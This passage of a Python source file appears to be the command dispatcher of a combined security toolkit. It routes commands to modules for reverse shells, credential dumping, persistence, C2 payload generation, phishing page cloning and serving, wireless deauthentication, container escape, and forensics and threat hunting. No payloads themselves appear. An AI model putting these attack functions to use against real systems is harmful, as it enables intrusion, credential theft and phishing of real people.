        # ================ Cloud Storage ================
        elif cmd == "cloud": cloud_storage.menu()
        elif cmd == "cloud-scan":
            cloud_storage.cli_scan(args.domain, args.provider,
                                    args.threads)
        elif cmd == "cloud-all":
            cloud_storage.cli_scan_all(args.domain, args.threads)
        elif cmd == "cloud-check":
            cloud_storage.cli_check(args.name, args.provider)
        elif cmd == "cloud-batch":
            cloud_storage.cli_batch(args.source, args.provider,
                                     args.threads)
        elif cmd == "cloud-azure": cloud_storage.cli_azure(args.account)
        elif cmd == "cloud-providers": cloud_storage.cli_providers()

        # ================ Cloud Attack Pro ================
        elif cmd == "cap": cloud_attack_pro.menu()
        elif cmd == "cap-imds": cloud_attack_pro.cli_imds(args.provider)
        elif cmd == "cap-privesc": cloud_attack_pro.cli_privesc()
        elif cmd == "cap-ssrf-headers":
            cloud_attack_pro.cli_ssrf_headers()
        elif cmd == "cap-aws-chain":
            cloud_attack_pro.cli_aws_chain(args.access_key,
                                            args.secret_key, args.token)
        elif cmd == "cap-metadata-ssrf":
            cloud_attack_pro.cli_metadata_ssrf(args.url)
        elif cmd == "cap-dorks": cloud_attack_pro.cli_dorks(args.org)
        elif cmd == "cap-lambda": cloud_attack_pro.cli_lambda()
        elif cmd == "cap-ip-bypass": cloud_attack_pro.cli_ip_bypass()

        # ================ AD Attack ================
        elif cmd == "ad": ad_attack.menu()
        elif cmd == "ad-tools": ad_attack.cli_tools()
        elif cmd == "ad-cheatsheets": ad_attack.cli_cheatsheets()
        elif cmd == "ad-cheat": ad_attack.cli_cheat(args.name)
        elif cmd == "ad-smb-signing":
            ad_attack.cli_smb_signing(args.dc)
        elif cmd == "ad-ldap-anon": ad_attack.cli_ldap_anon(args.dc)
        elif cmd == "ad-null-session":
            ad_attack.cli_null_session(args.dc)

        # ================ K8s ================
        elif cmd == "k8s": k8s_scanner.menu()
        elif cmd == "k8s-scan":
            k8s_scanner.cli_scan(args.host, args.ports)
        elif cmd == "k8s-api": k8s_scanner.cli_api(args.host)
        elif cmd == "k8s-etcd": k8s_scanner.cli_etcd(args.host)
        elif cmd == "k8s-docker": k8s_scanner.cli_docker(args.host)
        elif cmd == "k8s-escape": k8s_scanner.cli_escape()
        elif cmd == "k8s-ports": k8s_scanner.cli_ports()
        elif cmd == "k8s-cve-kb": k8s_scanner.cli_cve_kb()

        # ================ Container Escape ================
        elif cmd == "escape": container_escape.menu()
        elif cmd == "escape-scan": container_escape.cli_scan()
        elif cmd == "escape-cves": container_escape.cli_cves()
        elif cmd == "escape-cve":
            container_escape.cli_cve(args.cve_id)
        elif cmd == "escape-caps": container_escape.cli_caps()

        # ================ DB Attack ================
        elif cmd == "db": db_attack.menu()
        elif cmd == "db-scan": db_attack.cli_scan(args.host)
        elif cmd == "db-mongo": db_attack.cli_mongo(args.host)
        elif cmd == "db-redis": db_attack.cli_redis(args.host)
        elif cmd == "db-es": db_attack.cli_es(args.host)
        elif cmd == "db-sqlmap": db_attack.cli_sqlmap(args.url,
                                                       args.preset)
        elif cmd == "db-payloads": db_attack.cli_payloads(args.kind)
        elif cmd == "db-ports": db_attack.cli_ports()

        # ================ Pivot ================
        elif cmd == "pivot": pivot_helper.menu()
        elif cmd == "pivot-reverse":
            pivot_helper.cli_reverse_shells(args.lhost, args.lport)
        elif cmd == "pivot-bind":
            pivot_helper.cli_bind_shells(args.lport)
        elif cmd == "pivot-tty":
            pivot_helper.cli_tty_upgrade(args.lhost, args.lport)
        elif cmd == "pivot-transfer":
            pivot_helper.cli_file_transfer(args.lhost, args.target_ip)
        elif cmd == "pivot-tunnel":
            pivot_helper.cli_pivot(args.lhost, args.lport,
                                    args.target_ip)
        elif cmd == "pivot-linux":
            pivot_helper.cli_linux_privesc(args.target_ip)
        elif cmd == "pivot-windows":
            pivot_helper.cli_windows_privesc(args.lhost)
        elif cmd == "pivot-encode":
            pivot_helper.cli_payload_encoding()
        elif cmd == "pivot-tools": pivot_helper.cli_tools()
        elif cmd == "pivot-shortcuts":
            pivot_helper.quick_container_escape()
        elif cmd == "pivot-container":
            pivot_helper.quick_container_escape()
        elif cmd == "pivot-cloud":
            pivot_helper.quick_cloud_metadata()
        elif cmd == "pivot-cred-dump":
            pivot_helper.quick_cred_dump()
        elif cmd == "pivot-persistence":
            pivot_helper.quick_persistence()

        # ================ Red Team C2 ================
        elif cmd == "c2": redteam_c2.menu()
        elif cmd == "c2-sheets": redteam_c2.cli_sheets()
        elif cmd == "c2-sliver": redteam_c2.cli_sliver()
        elif cmd == "c2-havoc": redteam_c2.cli_havoc()
        elif cmd == "c2-mythic": redteam_c2.cli_mythic()
        elif cmd == "c2-msfvenom":
            redteam_c2.cli_msfvenom(args.lhost, args.lport)
        elif cmd == "c2-donut": redteam_c2.cli_donut()
        elif cmd == "c2-opsec": redteam_c2.cli_opsec()
        elif cmd == "c2-generators": redteam_c2.cli_generators()
        elif cmd == "c2-listeners": redteam_c2.cli_listeners()
        elif cmd == "c2-infra": redteam_c2.cli_infrastructure()
        elif cmd == "c2-evasion": redteam_c2.cli_evasion()
        elif cmd == "c2-mitre": redteam_c2.cli_mitre()

        # ================ Adversary Emulation ================
        elif cmd == "adv": adversary_emulation.menu()
        elif cmd == "adv-list": adversary_emulation.cli_list()
        elif cmd == "adv-tactic":
            adversary_emulation.cli_by_tactic(args.tactic)
        elif cmd == "adv-platform":
            adversary_emulation.cli_by_platform(args.platform)
        elif cmd == "adv-detail":
            adversary_emulation.cli_detail(args.ttp_id)
        elif cmd == "adv-tactics": adversary_emulation.cli_tactics()
        elif cmd == "adv-export-json":
            from modules.adversary_emulation import TTPS, export_json
            export_json(TTPS)
        elif cmd == "adv-export-md":
            from modules.adversary_emulation import TTPS, export_markdown
            export_markdown(TTPS)
        elif cmd == "adv-export-navigator":
            from modules.adversary_emulation import (TTPS,
                export_navigator_layer)
            export_navigator_layer(TTPS)

        # ================ Threat Intel ================
        elif cmd == "ti": threat_intel.menu()
        elif cmd == "ti-ip": threat_intel.cli_ip(args.ip)
        elif cmd == "ti-domain": threat_intel.cli_domain(args.domain)
        elif cmd == "ti-hash": threat_intel.cli_hash(args.hash)
        elif cmd == "ti-url": threat_intel.cli_url(args.url)
        elif cmd == "ti-auto": threat_intel.cli_auto(args.ioc)
        elif cmd == "ti-bulk":
            threat_intel.cli_bulk(args.source, threads=args.threads)
        elif cmd == "ti-sources": threat_intel.cli_sources()
        elif cmd == "ti-cache": threat_intel.cli_cache()

        # ================ Auto-Scan / Autopilot ================
        elif cmd == "autoscan": bugbounty_autoscan.menu()
        elif cmd == "autoscan-run":
            bugbounty_autoscan.cli_scan(
                args.domain, profile=args.profile,
                out_dir=args.out, skip=args.skip,
            )
        elif cmd == "autoscan-profiles":
            bugbounty_autoscan.cli_profiles()
        elif cmd == "autoscan-past": bugbounty_autoscan.cli_past()

        elif cmd == "ap": bugbounty_autopilot.menu()
        elif cmd == "ap-run":
            bugbounty_autopilot.cli_run(args.domain, args.profile)
        elif cmd == "ap-profiles": bugbounty_autopilot.cli_profiles()
        elif cmd == "ap-past": bugbounty_autopilot.cli_past()

        # ================ Report Pack ================
        elif cmd == "report-pack": report_pack.menu()
        elif cmd == "rp-new":
            report_pack.cli_wizard(platform=args.platform)
        elif cmd == "rp-preset":
            report_pack.cli_from_preset(args.platform, args.preset)
        elif cmd == "rp-from-finding":
            report_pack.cli_from_finding(
                args.finding_id, platform=args.platform,
                preset=args.preset,
            )
        elif cmd == "rp-bulk":
            report_pack.cli_bulk(target=args.target,
                                  platform=args.platform)
        elif cmd == "rp-platforms": report_pack.cli_platforms()
        elif cmd == "rp-presets": report_pack.cli_presets()
        elif cmd == "rp-cvss": report_pack.cli_cvss(args.vector)
        elif cmd == "rp-list": report_pack.cli_list()
        elif cmd == "rp-timeline":
            report_pack.cli_timeline(days=args.days)

        # ================ Social Engineering ================
        elif cmd == "se": social_engineer.menu()
        elif cmd == "se-templates": social_engineer.cli_templates()
        elif cmd == "se-phish":
            social_engineer.cli_generate(args.template, args.out)
        elif cmd == "se-server":
            social_engineer.cli_server(port=args.port,
                                        template=args.template,
                                        redirect=args.redirect)
        elif cmd == "se-qr":
            social_engineer.cli_qr(args.data, args.out)
        elif cmd == "se-qr-menu": social_engineer.qr_menu()
        elif cmd == "se-email":
            social_engineer.cli_email(args.template, link=args.link,
                                       name=args.name, out=args.out)
        elif cmd == "se-sms":
            social_engineer.cli_sms(args.template, link=args.link)
        elif cmd == "se-voice":
            social_engineer.cli_voice(args.name)
        elif cmd == "se-clone":
            social_engineer.cli_clone(args.url, args.out)
        elif cmd == "se-obfuscate":
            social_engineer.cli_obfuscate(args.url)
        elif cmd == "se-pixel":
            social_engineer.cli_pixel(args.server, args.out)

        # ================ SSRF Pro ================
        elif cmd == "ssrf": ssrf_pro.menu()
        elif cmd == "ssrf-cloud": ssrf_pro.cli_cloud()
        elif cmd == "ssrf-ip": ssrf_pro.cli_ip()
        elif cmd == "ssrf-schemes": ssrf_pro.cli_schemes()
        elif cmd == "ssrf-parser": ssrf_pro.cli_parser()
        elif cmd == "ssrf-rebind": ssrf_pro.cli_rebind(args.domain)
        elif cmd == "ssrf-blind": ssrf_pro.cli_blind()
        elif cmd == "ssrf-chains": ssrf_pro.cli_chains()
        elif cmd == "ssrf-export-all": ssrf_pro.cli_export_all()

        # ================ Web3 ================
        elif cmd == "web3": web3_security.menu()
        elif cmd == "web3-solidity":
            web3_security.cli_solidity(args.path)
        elif cmd == "web3-dir": web3_security.cli_dir(args.path)
        elif cmd == "web3-pk": web3_security.cli_pk(args.path)
        elif cmd == "web3-etherscan":
            web3_security.cli_etherscan(args.address)
        elif cmd == "web3-honeypot":
            web3_security.cli_honeypot(args.address)
        elif cmd == "web3-drainer":
            web3_security.cli_drainer(args.path)

        # ================ Mobile ================
        elif cmd == "mobile": mobile_security.menu()
        elif cmd == "mobile-analyze":
            mobile_security.cli_analyze(args.path)
        elif cmd == "mobile-apk": mobile_security.cli_apk(args.path)
        elif cmd == "mobile-ipa": mobile_security.cli_ipa(args.path)

        # ================ RE ================
        elif cmd == "re": re_suite.menu()
        elif cmd == "re-analyze": re_suite.cli_analyze(args.path)
        elif cmd == "re-strings":
            re_suite.cli_strings(args.path, args.min_len)
        elif cmd == "re-entropy": re_suite.cli_entropy(args.path)
        elif cmd == "re-yara": re_suite.cli_yara(args.path, args.rules)
        elif cmd == "re-pe": re_suite.cli_pe(args.path)
        elif cmd == "re-elf": re_suite.cli_elf(args.path)
        elif cmd == "re-macho": re_suite.cli_macho(args.path)
        elif cmd == "re-shellcode": re_suite.cli_shellcode(args.path)
        elif cmd == "re-miner": re_suite.cli_miner(args.path)

        # ================ Forensics ================
        elif cmd == "forensics": forensics_ir.menu()
        elif cmd == "forensics-ioc": forensics_ir.cli_ioc(args.path)
        elif cmd == "forensics-timeline":
            forensics_ir.cli_timeline(args.path)
        elif cmd == "forensics-sysmon":
            forensics_ir.cli_sysmon(args.path)
        elif cmd == "forensics-authlog":
            forensics_ir.cli_authlog(args.path)
        elif cmd == "forensics-auditd":
            forensics_ir.cli_auditd(args.path)
        elif cmd == "forensics-yara":
            forensics_ir.cli_yara(args.path, args.rules)
        elif cmd == "forensics-browser":
            forensics_ir.cli_browser(args.browser)

        # ================ Threat Hunting ================
        elif cmd == "hunting": threat_hunting.menu()
        elif cmd == "hunting-sigma": threat_hunting.cli_sigma()
        elif cmd == "hunting-playbooks": threat_hunting.cli_playbooks()
        elif cmd == "hunting-playbook":
            threat_hunting.cli_playbook(args.tactic)
        elif cmd == "hunting-mitre": threat_hunting.cli_mitre()
        elif cmd == "hunting-export-sigma":
            threat_hunting.export_sigma_dir()
        elif cmd == "hunting-export-navigator":
            threat_hunting.export_mitre_navigator()
        elif cmd == "hunting-export-dashboard":
            threat_hunting.export_dashboard()

        # ================ PCAP ================
        elif cmd == "pcap": pcap_analysis.menu()
        elif cmd == "pcap-analyze": pcap_analysis.cli_analyze(args.path)
        elif cmd == "pcap-html": pcap_analysis.cli_html(args.path)
        elif cmd == "pcap-csv": pcap_analysis.cli_csv(args.path)
        elif cmd == "pcap-md": pcap_analysis.cli_md(args.path)
        elif cmd == "pcap-all": pcap_analysis.cli_all(args.path)

        # ================ Wireless Attack ================
        elif cmd == "wl-tools": _wa_tools()
        elif cmd == "wl-ifaces": _wa_ifaces()
        elif cmd == "wl-wpa": _wa_wpa(iface=args.iface)
        elif cmd == "wl-pmkid": _wa_pmkid(iface=args.iface)
        elif cmd == "wl-wps":
            _wa_wps(iface=args.iface, bssid=args.bssid)
        elif cmd == "wl-evil":
            _wa_evil(ssid=args.ssid, iface=args.iface)
        elif cmd == "wl-deauth": _wa_deauth(iface=args.iface)

        # Wireless Attack Pro
        elif cmd == "wl-pro": wireless_attack_pro.menu()
        elif cmd == "wl-pro-tools": wireless_attack_pro.cli_tools()
        elif cmd == "wl-pro-cheatsheets":
            wireless_attack_pro.cli_cheatsheets()
        elif cmd == "wl-pro-cheat":
            wireless_attack_pro.cli_cheat(args.name)
        elif cmd == "wl-pro-export-all":
            wireless_attack_pro.cli_export_all()

        # ================ Compliance ================
        elif cmd == "audit": compliance_audit.menu()
        elif cmd == "audit-cis": compliance_audit.cli_cis()
        elif cmd == "audit-owasp": compliance_audit.cli_owasp_top10()
        elif cmd == "audit-asvs": compliance_audit.cli_asvs()
        elif cmd == "audit-pci": compliance_audit.cli_pci()
        elif cmd == "audit-iso": compliance_audit.cli_iso()
        elif cmd == "audit-nist": compliance_audit.cli_nist()
        elif cmd == "audit-all": compliance_audit.cli_all()
        elif cmd == "audit-live":
            items = []
            try:
                items.extend(compliance_audit.run_cis_linux())
                import shutil as _sh
                if _sh.which("docker"):
                    items.extend(compliance_audit.run_cis_docker())
            except Exception as exc:  # noqa: BLE001
                console.print(f"[red]{exc}[/red]")
            if items:
                compliance_audit._print_audit(items, "Full Live Audit")
                compliance_audit.export_audit(items, "full_live", "html")

        # ================ Plugin SDK ================
        elif cmd == "sdk": plugin_sdk.menu()
        elif cmd == "sdk-list": _sdk_list()
        elif cmd == "sdk-validate": _sdk_validate()
        elif cmd == "sdk-docs": _sdk_docs()
        elif cmd == "sdk-templates": _sdk_templates()
        elif cmd == "sdk-generate":
            _sdk_generate(args.name, args.template)

        # ================ Scheduler / Notifier / Bot ================
        elif cmd == "scheduler": scheduler.menu()
        elif cmd == "scheduler-list": scheduler.list_jobs()
        elif cmd == "scheduler-run": scheduler.run_forever()
        elif cmd == "scheduler-run-dry":
            scheduler.run_forever(dry_run=True)
        elif cmd == "scheduler-pause": scheduler.pause_scheduler()
        elif cmd == "scheduler-resume": scheduler.resume_scheduler()
        elif cmd == "scheduler-history": scheduler.show_history()

        elif cmd == "notify": notifier.menu()
        elif cmd == "notify-status": notifier.status()
        elif cmd == "notify-test": notifier.test_all()
        elif cmd == "notify-history": notifier.show_history()

        elif cmd == "bot": telegram_bot.run_bot_forever()
        elif cmd == "bot-info": telegram_bot.info()
        elif cmd == "bot-start":
            if telegram_bot.start_bot_background():
                console.print("[green]✓ Бот запущен в фоне[/green]")
        elif cmd == "bot-stop": telegram_bot.stop_bot()

        # ================ Stego ================
        elif cmd == "stego": stego_pro.menu()
        elif cmd == "stego-chi-png":
            from pathlib import Path as _P
            console.print(stego_pro.chi_square_png(_P(args.path)))
        elif cmd == "stego-chi-wav":
            from pathlib import Path as _P
            console.print(stego_pro.chi_square_wav(_P(args.path)))
        elif cmd == "stego-rs": stego_pro.cli_rs(args.path)
        elif cmd == "stego-spa": stego_pro.cli_spa(args.path)
        elif cmd == "stego-capacity":
            stego_pro.cli_capacity(args.path)

        # ================ Utils ================
        elif cmd == "utils": utils_tools.menu()
        elif cmd == "b64encode": print(utils_tools.b64_encode(args.text))
        elif cmd == "b64decode": print(utils_tools.b64_decode(args.text))
        elif cmd == "filehash": utils_tools.file_hashes(args.path)
        elif cmd == "revshell":
            _print_revshell(args.lhost, args.lport)

        # ================ Roadmap ================
        elif cmd == "roadmap": roadmap.menu()
        elif cmd == "roadmap-show":
            roadmap.show_roadmap(args.level)
        elif cmd == "roadmap-resources": roadmap.show_resources()
        elif cmd == "roadmap-certs": roadmap.show_certifications()
        elif cmd == "roadmap-quiz":
            roadmap.run_quiz(args.mode, args.category)
        elif cmd == "roadmap-progress": roadmap.show_progress()
        elif cmd == "roadmap-export":
            roadmap.export_roadmap(args.fmt)
        elif cmd == "roadmap-streak": roadmap.cli_streak()

        else:
            return False
    except KeyboardInterrupt:
        console.print("\n[yellow]Прервано.[/yellow]")
        return True
    except Exception as exc:  # noqa: BLE001
        log.exception("CLI ошибка: %s", exc)
        console.print(f"[red]Ошибка: {exc}[/red]")
        return True
    return True


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()

    if getattr(args, "tui", False) or args.cmd == "tui":
        from tui.app import run_tui
        run_tui()
        return

    if not args.no_banner:
        show_banner()

    if args.cmd:
        _dispatch_cli(args)
        return

    interactive()


if __name__ == "__main__":
    main()